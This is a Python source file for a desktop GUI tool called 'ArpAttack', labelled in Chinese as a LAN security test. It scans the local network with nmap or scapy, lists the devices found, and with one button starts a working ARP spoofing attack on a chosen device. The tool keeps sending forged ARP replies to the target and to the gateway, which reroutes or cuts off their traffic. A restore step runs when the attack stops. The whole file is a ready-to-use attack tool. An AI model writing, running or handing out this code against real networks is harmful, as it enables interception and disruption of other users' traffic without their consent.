import tkinter as tk
from tkinter import ttk, messagebox
import threading
import asyncio
import time
import sys
import os
import subprocess
import shutil
import re
from scapy.all import Ether, ARP, sendp, get_if_hwaddr, srp, conf, get_if_list, get_working_if

# ============ 跨平台配置 ============
IS_WINDOWS = sys.platform.startswith('win')

def find_nmap():
    if not IS_WINDOWS:
        return shutil.which("nmap")
    paths = [
        shutil.which("nmap"),
        r"C:\Program Files (x86)\Nmap\nmap.exe",
        r"C:\Program Files\Nmap\nmap.exe",
    ]
    for p in paths:
        if p and os.path.exists(p):
            return p
    return None

NMAP_PATH = find_nmap()

def normalize_mac(mac):
    return mac.lower().replace("-", ":")

# ============ 异步逻辑 ============

class AsyncManager:
    """管理后台 asyncio 事件循环"""
    def __init__(self):
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self._run_loop, daemon=True)
        self.thread.start()

    def _run_loop(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()

    def run_coro(self, coro):
        return asyncio.run_coroutine_threadsafe(coro, self.loop)

async_manager = AsyncManager()

async def scan_devices_nmap_async(scan_cidr):
    """使用 asyncio 子进程调用 nmap"""
    if not NMAP_PATH:
        return None
    
    try:
        proc = await asyncio.create_subprocess_exec(
            NMAP_PATH, "-sn", scan_cidr,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await proc.communicate()
        output = stdout.decode()
        
        sections = output.split("Nmap scan report for ")
        found_devices = []
        for section in sections[1:]:
            lines = section.strip().split("\n")
            ip_match = re.search(r"(\d+\.\d+\.\d+\.\d+)", lines[0])
            if not ip_match: continue
            ip = ip_match.group(1)
            
            mac = None
            vendor = "Unknown"
            for line in lines:
                if "MAC Address:" in line:
                    mac_match = re.search(r"(([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}))", line)
                    if mac_match:
                        mac = normalize_mac(mac_match.group(1))
                        vendor_match = re.search(r"\((.*)\)", line)
                        if vendor_match:
                            vendor = vendor_match.group(1)
                        break
            if mac:
                found_devices.append({"ip": ip, "mac": mac, "vendor": vendor})
        return found_devices
    except Exception as e:
        print(f"Nmap async scan error: {e}")
        return None

async def scan_devices_scapy_async(iface, scan_cidr):
    """在 executor 中运行 scapy 扫描"""
    loop = asyncio.get_running_loop()
    
    def scapy_scan():
        print(f"[*] 使用 Scapy 扫描: {scan_cidr}")
        base_net = scan_cidr.split('/')[0].rsplit('.', 1)[0]
        found = []
        for i in range(0, 256, 32):
            chunk_ips = [f"{base_net}.{j}" for j in range(i, min(i + 32, 256))]
            try:
                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=chunk_ips), timeout=2, retry=1, inter=0.02, verbose=False, iface=iface)
                for _, received in ans:
                    found.append({"ip": received.psrc, "mac": normalize_mac(received.hwsrc), "vendor": "Scapy Detected"})
            except: pass
        return found

    return await loop.run_in_executor(None, scapy_scan)

# ============ GUI 类 ============

class ArpAttackGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("ArpAttack - 局域网安全测试 (Async 版)")
        self.root.geometry("800x600")
        
        self.attack_task = None
        self.setup_ui()
        
        # 异步初始化：获取网卡和网关，不阻塞主线程
        self.root.after(100, self.async_init)
        
    def async_init(self):
        self.status_var.set("正在初始化网络配置...")
        async_manager.run_coro(self.refresh_interfaces_async())
        
    def setup_ui(self):
        ctrl_frame = ttk.Frame(self.root, padding="10")
        ctrl_frame.pack(fill=tk.X)
        
        ttk.Label(ctrl_frame, text="网卡:").grid(row=0, column=0, padx=5)
        self.iface_var = tk.StringVar(value="正在加载...")
        # 改用原生的 OptionMenu 以提升 macOS 下的响应速度
        self.iface_menu = tk.OptionMenu(ctrl_frame, self.iface_var, "正在加载...", command=self.on_iface_change)
        self.iface_menu.grid(row=0, column=1, padx=5)
        
        ttk.Label(ctrl_frame, text="网关:").grid(row=0, column=2, padx=5)
        self.gateway_var = tk.StringVar(value="192.168.1.1")
        ttk.Entry(ctrl_frame, textvariable=self.gateway_var, width=15).grid(row=0, column=3, padx=5)
        
        self.scan_btn = ttk.Button(ctrl_frame, text="扫描设备", command=self.on_scan_click)
        self.scan_btn.grid(row=0, column=4, padx=10)
        
        list_frame = ttk.LabelFrame(self.root, text="设备列表", padding="10")
        list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.tree = ttk.Treeview(list_frame, columns=("ip", "mac", "vendor"), show="headings")
        self.tree.heading("ip", text="IP 地址")
        self.tree.heading("mac", text="MAC 地址")
        self.tree.heading("vendor", text="设备厂商")
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        scrollbar = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.tree.yview)
        self.tree.configure(yscroll=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        bottom_frame = ttk.Frame(self.root, padding="10")
        bottom_frame.pack(fill=tk.X)
        
        self.status_var = tk.StringVar(value="准备就绪")
        ttk.Label(bottom_frame, textvariable=self.status_var, foreground="blue").pack(side=tk.LEFT)
        
        # 增加进度条
        self.progress = ttk.Progressbar(bottom_frame, orient=tk.HORIZONTAL, length=150, mode='indeterminate')
        self.progress.pack(side=tk.LEFT, padx=20)
        self.progress.pack_forget() # 初始隐藏
        
        self.attack_btn = ttk.Button(bottom_frame, text="开始 ARP 攻击", command=self.on_attack_click, state=tk.DISABLED)
        self.attack_btn.pack(side=tk.RIGHT, padx=5)
        
        self.tree.bind("<<TreeviewSelect>>", lambda e: self.attack_btn.config(state=tk.NORMAL if self.tree.selection() else tk.DISABLED))

    def on_iface_change(self, selected_iface):
        """当用户手动切换网卡时触发"""
        def update_gw():
            try:
                # 快速查找网关
                for r in conf.route.routes:
                    if r[3] == selected_iface and r[0] == 0:
                        self.root.after(0, lambda: self.gateway_var.set(r[2]))
                        print(f"[*] 切换网卡 {selected_iface}，自动更新网关为: {r[2]}")
                        return
            except: pass
        threading.Thread(target=update_gw, daemon=True).start()

    async def refresh_interfaces_async(self):
        """异步获取网卡和网关信息"""
        loop = asyncio.get_running_loop()
        try:
            def get_data():
                # 获取简单的网卡名称列表
                ifaces = sorted([str(i) for i in get_if_list()])
                ifaces = [i for i in ifaces if i.startswith('en')] + [i for i in ifaces if not i.startswith('en')]
                
                gw, default_if = "192.168.1.1", "en0"
                try:
                    res = conf.route.route("0.0.0.0")
                    gw, default_if = res[1], res[0]
                except: pass
                return ifaces, gw, default_if

            ifaces, gw, default_if = await loop.run_in_executor(None, get_data)
            
            def update_ui():
                # 更新 OptionMenu 的内容
                menu = self.iface_menu["menu"]
                menu.delete(0, "end")
                for i in ifaces:
                    menu.add_command(label=i, command=tk._setit(self.iface_var, i, self.on_iface_change))
                
                self.iface_var.set(str(default_if))
                self.gateway_var.set(gw)
                self.status_var.set("配置已就绪")
                print(f"[*] 已刷新网卡列表: {len(ifaces)} 个")

            self.root.after(0, update_ui)
        except Exception as e:
            print(f"[!] 异步初始化失败: {e}")
            self.root.after(0, lambda: self.status_var.set("初始化失败，请手动检查"))

    def on_scan_click(self):
        self.scan_btn.config(state=tk.DISABLED)
        self.status_var.set("正在深度扫描局域网设备...")
        self.progress.pack(side=tk.LEFT, padx=20) # 显示进度条
        self.progress.start(10) # 启动动画
        self.tree.delete(*self.tree.get_children())
        
        gw = self.gateway_var.get()
        cidr = ".".join(gw.split(".")[:-1]) + ".0/24"
        iface = self.iface_var.get()
        
        async def do_scan():
            # 1. 尝试 Nmap
            devices = await scan_devices_nmap_async(cidr)
            # 2. 尝试 Scapy
            if devices is None:
                devices = await scan_devices_scapy_async(iface, cidr)
            
            # 回到主线程更新 UI
            self.root.after(0, lambda: self.update_ui_with_devices(devices))
            
        async_manager.run_coro(do_scan())

    def update_ui_with_devices(self, devices):
        for d in devices:
            self.tree.insert("", tk.END, values=(d["ip"], d["mac"], d["vendor"]))
        self.status_var.set(f"扫描完成 (发现 {len(devices)} 台设备)")
        self.progress.stop() # 停止动画
        self.progress.pack_forget() # 隐藏进度条
        self.scan_btn.config(state=tk.NORMAL)

    def on_attack_click(self):
        if not self.attack_task:
            self.start_attack()
        else:
            self.stop_attack()

    def start_attack(self):
        sel = self.tree.selection()
        if not sel: return
        
        ip, mac, _ = self.tree.item(sel[0])["values"]
        gw = self.gateway_var.get()
        iface = self.iface_var.get()
        
        async def run_attack():
            try:
                print(f"[*] 准备对 {ip} 进行攻击...")
                print(f"[*] 使用网卡: {iface}, 网关: {gw}")
                self.root.after(0, lambda: self.status_var.set("正在获取网关 MAC..."))
                loop = asyncio.get_running_loop()
                def get_gw_mac():
                    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gw), timeout=3, retry=2, verbose=False, iface=iface)
                    return ans[0][1].hwsrc if ans else None
                
                gw_mac = await loop.run_in_executor(None, get_gw_mac)
                if not gw_mac: raise Exception(f"无法发现网关 {gw} 的 MAC")
                
                self_mac = get_if_hwaddr(iface)
                p1 = Ether(dst=mac, src=self_mac)/ARP(op=2, psrc=gw, hwsrc=self_mac, pdst=ip, hwdst=mac)
                p2 = Ether(dst=gw_mac, src=self_mac)/ARP(op=2, psrc=ip, hwsrc=self_mac, pdst=gw, hwdst=gw_mac)
                
                self.root.after(0, lambda: self.status_var.set(f"攻击进行中: {ip}"))
                self.root.after(0, lambda: self.attack_btn.config(text="停止攻击"))
                
                while True:
                    await loop.run_in_executor(None, lambda: sendp([p1, p2], iface=iface, verbose=False))
                    await asyncio.sleep(1)
            except asyncio.CancelledError:
                # 恢复
                r1 = Ether(dst=mac)/ARP(op=2, psrc=gw, hwsrc=gw_mac, pdst=ip, hwdst=mac)
                r2 = Ether(dst=gw_mac)/ARP(op=2, psrc=ip, hwsrc=mac, pdst=gw, hwdst=gw_mac)
                await loop.run_in_executor(None, lambda: sendp([r1, r2], iface=iface, count=3, verbose=False))
                self.root.after(0, lambda: self.status_var.set("攻击已停止且 ARP 已恢复"))
            except Exception as e:
                self.root.after(0, lambda: messagebox.showerror("错误", str(e)))
                self.root.after(0, lambda: self.stop_attack())

        self.attack_task = async_manager.run_coro(run_attack())

    def stop_attack(self):
        if self.attack_task:
            self.attack_task.cancel()
            self.attack_task = None
        self.attack_btn.config(text="开始 ARP 攻击")

if __name__ == "__main__":
    if not (os.getuid() == 0 if not IS_WINDOWS else True):
        print("警告: 建议以 Root/管理员 权限运行")
    
    root = tk.Tk()
    app = ArpAttackGUI(root)
    root.mainloop()
